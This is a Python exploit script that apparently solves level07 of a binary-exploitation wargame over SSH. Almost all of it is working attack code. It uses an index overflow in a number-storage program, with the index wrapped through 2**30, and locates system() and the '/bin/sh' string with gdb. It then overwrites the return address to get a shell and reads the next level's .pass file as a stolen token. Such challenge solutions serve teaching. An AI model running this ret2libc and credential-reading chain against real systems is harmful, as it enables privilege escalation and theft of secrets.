import os
import sys

bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, connect_by_previous, get_func_address
from utils.text import print_output, print_title, print_magic, print_action
from utils.base import save_token, address_to_decimal

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

binary_name = files_list[0]

output = exec(client, f'echo "quit" | ./{binary_name}', title='Simple execute binary with test arg')
print_output(output)
print_title("3 commands we can apply, store, read and quit, a little reverse")
print_magic('Debug Time!')

print_title('We can store any data at buffer, and read already write data, try to find allocated size to get offset')
output = exec(client, f'''for((i=0;i<150;i++)); do OUTPUT=`/home/users/{binary_name}/{binary_name} < <(python -c "print('read\\n$i\\nquit')") | grep 'Input command:  Index:'` ; NB=`echo $OUTPUT | cut -d " " -f 8`; HEX=`printf %x $NB` ; echo $OUTPUT | awk '{{ print $6,"0x'"$HEX"'"}}' | egrep "114" ; done''')
print_output(output)
print_title('Is index is overflow')
overflow_index = output[0].split('[')[1].split(']')[0]

print_title('Ger reserved number')
print_action(f"2**30 + {int(overflow_index)}")
num = 2**30 + int(overflow_index)
print_output(num)

output = get_func_address(client, 'system')
print_output(output)

print_title('Transform address to decimal')
system_address_decimal = address_to_decimal(output)
print_output(str(system_address_decimal))

sh_address = exec(
    client,
    f'''echo "y" | gdb ./{binary_name} -q -ex "b*main" -ex "r" -ex 'find __libc_start_main,+99999999,"/bin/sh"\'''',
    title=f'Get #bin/sh address')[5]
print_output(sh_address)

print_title('Transform address to decimal')
sh_address_decimal = address_to_decimal(sh_address)
print_output(str(sh_address))

print_title('Time to replace EIP to system address (check whoami)')
f = lambda cmd: exec(
    client, f'echo -e "{cmd}" | (echo -e "store\\n{system_address_decimal}\\n{num}\\nstore\\n{sh_address_decimal}\\n116\\nquit\\n"; cat -) | ./level07 | tail -n 1 | awk \'{{print $5}}\''
)[0]
print_output(f('whoami'))
print_title('Nice')

print_magic('Steal the password')
token = f(f'cat /home/users/level08/.pass')
print_output(token)

save_token(token)
